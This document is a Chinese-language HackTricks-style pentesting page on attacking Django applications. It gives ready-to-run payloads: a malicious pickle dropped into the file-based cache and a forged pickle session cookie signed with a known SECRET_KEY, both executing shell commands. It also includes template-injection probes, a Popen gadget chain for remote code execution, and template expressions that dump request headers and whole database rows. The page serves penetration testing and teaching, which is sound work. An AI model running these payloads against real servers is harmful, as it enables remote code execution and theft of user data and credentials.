# Django

{{#include ../../banners/hacktricks-training.md}}

## 缓存操纵导致 RCE
Django 默认的缓存存储方式是 [Python pickles](https://docs.python.org/3/library/pickle.html)，如果 [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf) 时可能导致 RCE。**如果 attacker 能获得对 cache 的写权限，就可以将该漏洞升级为对底层服务器的 RCE。**

Django 的缓存可以存放在四个位置之一： [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12)、[memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16)、[files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16)，或一个 [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95)。存放在 Redis server 或 database 的缓存最可能成为攻击向量（Redis injection 和 SQL injection），但 attacker 也可能利用基于文件的 cache 将任意写入转换为 RCE。维护者已将此标记为非问题。需要注意的是，cache 文件夹、SQL 表名和 Redis server 细节会根据实现有所不同。

在 **FileBasedCache** 中，pickled 值会写入 `CACHES['default']['LOCATION']` 下的一个文件（通常为 `/var/tmp/django_cache/`）。如果该目录对所有人可写或被 attacker 控制，在预期的 cache key 下放置恶意 pickle，会在应用读取时触发代码执行：
```bash
python - <<'PY'
import pickle, os
class RCE:
def __reduce__(self):
return (os.system, ("id >/tmp/pwned",))
open('/var/tmp/django_cache/cache:malicious', 'wb').write(pickle.dumps(RCE(), protocol=4))
PY
```
This HackerOne report provides a great, reproducible example of exploiting Django cache stored in a SQLite database: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
Django Template Language (DTL) 是 **图灵完备的**。如果用户提供的数据被渲染为 *template string*（例如通过调用 `Template(user_input).render()` 或当 `|safe`/`format_html()` 移除自动转义时），攻击者可能实现完整的 SSTI → RCE。

### Detection
1. 寻找对 `Template()` / `Engine.from_string()` / `render_to_string()` 的动态调用，这些调用包含任何未消毒的请求数据。
2. 发送基于时间或算术的 payload:
```django
{{7*7}}
```
如果渲染输出包含 `49`，说明输入被模板引擎编译。
3. DTL **不是 Jinja2**：算术/循环 payloads 经常触发 `TemplateSyntaxError`/500，但仍能证明求值。像 `${{<%[%'"}}%` 这样的 polyglots 是不错的崩溃或渲染探针。

### Context exfiltration when RCE is blocked
即使对象遍历到 `subprocess.Popen` 失败，DTL 仍会暴露作用域内的对象：
```django
{{ request }}               {# confirm SSTI #}
{{ request.META }}           {# leak Gunicorn/UWSGI headers, cookies, proxy info #}
{{ users }}                  {# QuerySet in the context? #}
{{ users.0 }}                {# first row #}
{{ users.values }}           {# dumps dicts of every column (email/flags/plaintext passwords if stored) #}
```
`QuerySet.values()` 将行强制转换为字典，绕过 `__str__` 并暴露 queryset 返回的所有字段。即使直接的 Python 执行被过滤，这个方法仍然有效。

**Automation pattern**: 验证身份，获取 CSRF token，将带标记前缀的 payload 存入任何持久字段（例如 用户名/个人简介），然后请求渲染它的视图（像 `/likes/<id>` 这样的 AJAX endpoints 很常见）。解析一个稳定的属性（例如 `title="..."`）以恢复渲染结果并迭代 payloads。

### 原语到 RCE
Django 阻止对 `__import__` 的直接访问，但 Python 对象图是可达的：
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
找到 `subprocess.Popen` 的索引（≈400–500，取决于 Python 构建）并执行任意命令：
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
一个更安全的通用 gadget 是迭代直到 `cls.__name__ == 'Popen'`。

相同的 gadget 也适用于错误处理用户输入的 **Debug Toolbar** 或 **Django-CMS** 模板渲染功能。

---

### 另见：ReportLab/xhtml2pdf PDF export RCE
基于 Django 的应用通常会集成 xhtml2pdf/ReportLab 来将视图导出为 PDF。当用户可控的 HTML 流入 PDF 生成时，rl_safe_eval 可能会评估三重括号 `[[[ ... ]]]` 内的表达式，从而导致代码执行 (CVE-2023-33733)。详情、payloads 和 缓解措施：

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

---

## Pickle-Backed Session Cookie RCE
如果设置 `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` 被启用（或使用反序列化 pickle 的自定义序列化器），Django 会在调用任何视图代码之前解密并反序列化会话 cookie。因此，拥有有效的签名密钥（项目默认的 `SECRET_KEY`）即可导致即时的远程代码执行。

### Exploit Requirements
* 服务器使用 `PickleSerializer`。
* 攻击者知道/能够猜到 `settings.SECRET_KEY` (leaks via GitHub, `.env`, 错误页面，等)。

### 概念验证
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
发送得到的 cookie，payload 将以 WSGI worker 的权限运行。

**缓解措施**：保持默认的 `JSONSerializer`，轮换 `SECRET_KEY`，并配置 `SESSION_COOKIE_HTTPONLY`。

---

## 最近（2023-2025）渗透测试人员应关注的高影响 Django CVE
* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (fixed June 4 2025)。允许攻击者将换行符/ANSI 代码夹带入日志文件，从而污染下游的日志分析。补丁级别 ≥ 4.2.22 / 5.1.10 / 5.2.2。
* **CVE-2024-42005** – *Critical SQL injection* in `QuerySet.values()/values_list()` on `JSONField` (CVSS 9.8)。构造 JSON 键以突破引号并执行任意 SQL。已在 4.2.15 / 5.0.8 中修复。

始终通过 `X-Frame-Options` 错误页面或 `/static/admin/css/base.css` 的哈希来指纹精确的框架版本，并在适用时测试上述问题。

---

## 参考资料
* Django security release – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 4 Jun 2025.
* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 11 Aug 2024.
* 0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE and pivot into AD – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
* Django docs – QuerySet.values(): [https://docs.djangoproject.com/en/6.0/ref/models/querysets/#values](https://docs.djangoproject.com/en/6.0/ref/models/querysets/#values)
* 0xdf: HackNet (HTB) — HTML Attribute Injection → Django SSTI → QuerySet.values data dump → Pickle FileBasedCache RCE – [https://0xdf.gitlab.io/2026/01/17/htb-hacknet.html](https://0xdf.gitlab.io/2026/01/17/htb-hacknet.html)

{{#include ../../banners/hacktricks-training.md}}
